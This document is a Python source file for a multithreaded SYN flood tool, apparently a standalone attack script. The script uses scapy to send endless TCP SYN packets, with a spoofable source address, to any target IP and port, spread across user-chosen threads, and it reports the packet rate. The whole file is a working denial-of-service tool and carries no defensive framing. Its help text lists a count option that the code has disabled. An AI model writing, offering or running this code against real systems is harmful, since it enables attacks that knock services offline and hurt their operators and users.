#!/usr/bin/python3
# Emre Ovunc
# info@emreovunc.com
# Python3 SYN Flood Tool CMD v2.0.1

from sys import stdout
from scapy.all import *
from random import randint
from argparse import ArgumentParser
import threading, time

class Counter(object):
	def __init__(self):
		self.lock = threading.Lock()
		self.value = 0

	def inc(self):
		with self.lock:
			self.value += 1

	def reset(self):
		with self.lock:
			v = self.value
			self.value = 0
			return v

counter = Counter()





def randomIP():
	ip = ".".join(map(str, (randint(0, 255)for _ in range(4))))
	return ip


def randInt():
	x = randint(1000, 9000)
	return x


def SYN_Flood(dstIP, srcIP, dstPort):
	#total = 0
	global counter

	#for x in range (0, counter):
	while True:
		s_port = randInt()
		s_eq = randInt()
		w_indow = randInt()

		IP_Packet = IP ()
		#IP_Packet.src = randomIP()
		IP_Packet.src = srcIP
		IP_Packet.dst = dstIP

		TCP_Packet = TCP ()
		TCP_Packet.sport = s_port
		TCP_Packet.dport = int(dstPort)
		TCP_Packet.flags = "S"
		TCP_Packet.seq = s_eq
		TCP_Packet.window = w_indow

		send(IP_Packet/TCP_Packet, verbose=0)
		counter.inc()

	#stdout.write("\rTotal packets sent: %i\n" % total)


def main():
	parser = ArgumentParser()
	parser.add_argument('--target', '-t', help='target IP address')
	parser.add_argument('--port', '-p', help='target port number')
	#parser.add_argument('--count', '-c', help='number of packets')
	parser.add_argument('--source', '-s', help='source IP address')
	parser.add_argument('--threads', '-d', help='number of threads')
	parser.add_argument('--version', '-v', action='version', version='Python SynFlood Tool v2.0.1\n@EmreOvunc')
	parser.epilog = "Usage: python3 py3_synflood_cmd.py -t 10.20.30.40 -p 8080 -c 1"

	args = parser.parse_args()

	global counter

	if args.target is not None:
		if args.port is not None:

			# Start flooding with multiple threads
			#SYN_Flood(args.target, args.source, args.port)
			print ("Packets are sending ...")
			for _ in range(int(args.threads)):
				t = threading.Thread(target=SYN_Flood, args=(args.target, args.source, args.port))
				t.start()
				# t.join()


			while True:
				print('\r%i pkt/s'% counter.reset(), end='' )
				time.sleep(1)



		else:
			print('[-]Please, use --port/-p to give target\'s port!')
			print('[!]Example: -p 445')
			print('[?] -h for help')
			exit()
	else:
		print('''usage: py3_synflood_cmd.py [-h] [--target TARGET] [--port PORT]
						   [--count COUNT] [--version]
optional arguments:
  -h, --help			show this help message and exit
  --target TARGET, -t TARGET
						target IP address
  --port PORT, -p PORT  target port number
  --count COUNT, -c COUNT
						number of packets
  --version, -v		 show program's version number and exit''')
		exit()

main()
